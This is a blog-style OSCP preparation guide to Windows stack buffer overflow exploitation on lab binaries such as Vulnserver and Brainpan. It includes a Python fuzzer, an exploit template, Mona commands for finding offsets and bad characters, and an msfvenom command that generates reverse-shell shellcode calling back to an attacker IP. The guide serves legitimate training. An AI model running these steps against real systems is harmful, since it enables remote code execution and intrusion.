---
date: '2025-02-02T00:20:03+05:30'
draft: false
title: 'Buffer Overflow Guide: OSCP Preparation'
slug: buffer-overflow-oscp
tags: ["oscp", "buffer-overflow", "exploit-development", "windows", "debugging"]
category: writeups
showtoc: true
summary: A comprehensive guide to Windows buffer overflow exploitation, including fuzzing, finding bad characters, and generating shellcode
description: Detailed walkthrough of the buffer overflow exploitation process using Immunity Debugger and Mona, perfect for OSCP exam preparation
---

# Windows Buffer Overflow Exploitation Guide

## Initial Setup

### Remote Desktop Access
```bash
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
```

### Available Binaries
- SLMail installer
- Brainpan binary
- Dostackbufferoverflowgood binary
- Vulnserver binary
- Custom "oscp" binary (10 different buffer overflows)

## Exploitation Process

### 1. Mona Configuration

Configure working directory in Immunity Debugger:
```
!mona config -set workingfolder c:\mona\%p
```

### 2. Fuzzing

Create `fuzzer.py`:
```python
#!/usr/bin/env python3
import socket, time, sys

ip = "target-ip"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

### 3. Crash Replication

Create `exploit.py`:
```python
import socket

ip = "target-ip"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

### 4. Finding the Offset

1. Generate pattern:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

2. Find offset in Immunity Debugger:
```
!mona findmsp -distance 600
```

![Pattern Generation](images/buffer-overflow-1.png)

### 5. Finding Bad Characters

1. Generate bytearray in Mona:
```
!mona bytearray -b "\x00"
```

2. Generate bad chars in Python:
```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

3. Compare in Mona:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

### 6. Finding Jump Point

Find "jmp esp" instruction:
```
!mona jmp -r esp -cpb "\x00"
```

### 7. Generating Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

### 8. Final Exploit Structure

1. Prefix: Command string
2. Offset: Buffer size to EIP
3. Return Address: JMP ESP address (reversed)
4. NOPs: "\x90" * 16
5. Shellcode: Generated payload

## Best Practices

1. **Debugging Process**
   - Always restart the application
   - Clear debugger logs
   - Take notes of crashes

2. **Bad Character Analysis**
   - Start with \x00
   - Check for cascading corruption
   - Verify multiple times

3. **Shellcode Generation**
   - Use appropriate EXITFUNC
   - Include all bad chars
   - Add sufficient NOPs

## Common Issues

1. **Application Crashes**
   - Incorrect offset
   - Bad character corruption
   - Invalid return address

2. **Failed Exploitation**
   - Insufficient NOP sled
   - Incorrect bad char list
   - Network connectivity issues

## Tools Used

1. **Immunity Debugger**
   - Process debugging
   - Memory analysis
   - Crash investigation

2. **Mona.py**
   - Pattern creation
   - Bad char analysis
   - Jump point finding

3. **MSFvenom**
   - Shellcode generation
   - Payload encoding
   - Bad char handling

## References

1. [Tib3rius Pentest Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
2. [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
3. [Mona Documentation](https://github.com/corelan/mona)
4. [OSCP Buffer Overflow Guide](https://www.offensive-security.com/)
